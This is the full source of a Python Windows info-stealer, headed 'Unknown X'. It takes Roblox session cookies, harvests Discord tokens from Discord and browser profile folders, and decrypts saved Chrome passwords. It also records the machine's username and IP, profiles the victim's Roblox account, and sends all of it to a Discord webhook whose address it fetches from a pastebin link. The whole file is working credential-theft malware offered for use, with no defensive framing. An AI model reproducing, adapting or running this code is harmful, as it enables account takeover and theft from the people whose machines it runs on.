import browser_cookie3, os, re, requests
import json, base64, sqlite3, win32crypt, shutil
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
#======================================================#
# THIS IS A PRODUCTION SCRIPT DO NOT USE AS ACTUAL STUB!
#======================================================#
# get pc username
def get_user():
    try:
        userhome = os.path.expanduser('~')
        return os.path.split(userhome)[-1]
    except Exception as e:
        print(e)
        return 'na'
        pass
# get ip
def get_ip():
    try:
        return requests.get('https://api.ipify.org/?format=json').json()['ip']
    except Exception as e:
        print(e)
        return 'na'
        pass
# gets roblox cookie
def roblox():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com') # uses browser_cookie3 to get all cookies from domain
        cookies = str(cookies) # makes cookies a string to split
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip() # gets cookie from all cookies
        return cookie # returns cookie
    except Exception as e:
        print(e)
        return 'na' # if it didnt work :(
        pass

# for getting discord token
def find_tokens(path):
    try:
        path += '\\Local Storage\\leveldb'
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    except Exception as e:
        print(e)
        pass
    return tokens
# gets token location(s)
def get_tokens():
    try:
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        message = ''
        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                pass
        return message
    except Exception as e:
        print(e)
        pass
# getting passwords
def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        print(e)
        pass
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
def get_chrome():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    data = []
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            if 'roblox' in action_url:
                data.append(f'{username}:{password}\n')
        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except Exception as e:
        print(e)
        pass
    return data

def getandsenddata():
    passwords = get_chrome()
    cookie = roblox()
    discord_token = get_tokens()
    pcuser = get_user()
    ip = get_ip()
    tmp = ''
    passwords = tmp.join(passwords)
    # Check cookie data:
    try:
        reqr = requests.Session()
        reqr.cookies['.ROBLOSECURITY'] = cookie
        r1 = reqr.get('http://www.roblox.com/mobileapi/userinfo').json()
        userID = r1['UserID']
        username = r1['UserName']
        robux = r1['RobuxBalance']
        premium = r1['IsPremium']
        r2 = reqr.get('https://accountsettings.roblox.com/v1/email').json()
        Verified_Email = r2['verified']
        r3 = reqr.get('https://auth.roblox.com/v1/account/pin').json()
        HasPin = r3['isEnabled']
        r = reqr.get(f'https://users.roblox.com/v1/users/{userID}').json()
        created = r['created']
    except Exception as e:
        print(e)
        cookie = 'na'
        userID = 'na'
        username = 'na'
        robux = 'na'
        premium = 'na'
        Verified_Email = 'na'
        HasPin = 'na'
        created = 'na'
        pass
    # sends to api to check cookie
    #r = requests.post(f'http://127.0.0.1:5000/webhook/{cookie}')
    #print(r.content)
    #r2 = requests.post(f'http://127.0.0.1:5000/webhook2/{pcuser}/{ip}/{discord_token}/{passwords}')
    #print(r2.content)
    webhook = requests.get('https://pastebin.com/raw/yu9tYfC9').json()
    webhook = webhook['webhook']
    data = {
        'username' : 'Unknown X'
    }
    data["embeds"] = [
        {
            'title' : f'User Logged: {pcuser}:{ip}',
            "fields": [
                {
                    "name": 'Cookie:',
                    "value": f'```{cookie}```',
                    "inline": False
                },
                {
                    "name": "UserName:",
                    "value": f'```{username}```',
                    "inline": True
                },
                {
                    "name": "Robux:",
                    "value": f'```{robux}```',
                    "inline": True
                },
                {
                    "name": "Premium:",
                    "value": f'```{premium}```',
                    "inline": True
                },
                {
                    "name": "Verified Email:",
                    "value": f'```{Verified_Email}```',
                    "inline": True
                },
                {
                    "name": "Has Pin:",
                    "value": f'```{HasPin}```',
                    "inline": True
                },
                {
                    "name": "Created:",
                    "value": f'```{created}```',
                    "inline": True
                },
                {
                    "name": "Profile/Rolimons:",
                    "value": f'[Profile](https://roblox.com/users/{userID}) : [Rolimons](https://www.rolimons.com/player/{userID})',
                    "inline": True
                }
            ]
        }
    ]
    requests.post(webhook, json=data)
    data = {
        'username': 'Unknown X'
    }
    data["embeds"] = [
        {
            'title' : f'User Logged: {pcuser}:{ip}',
            "fields": [
                {
                    'name': 'Password(s) - Roblox:',
                    'value': f'```{passwords}```',
                    'inline': 'False'
                },
                {
                    'name': 'Discord Token(s):',
                    'value': f'```{discord_token}```'
                }
            ]
        }
    ]
    requests.post(webhook, json=data)
if __name__ == "__main__":
    getandsenddata()
    input('Finished!')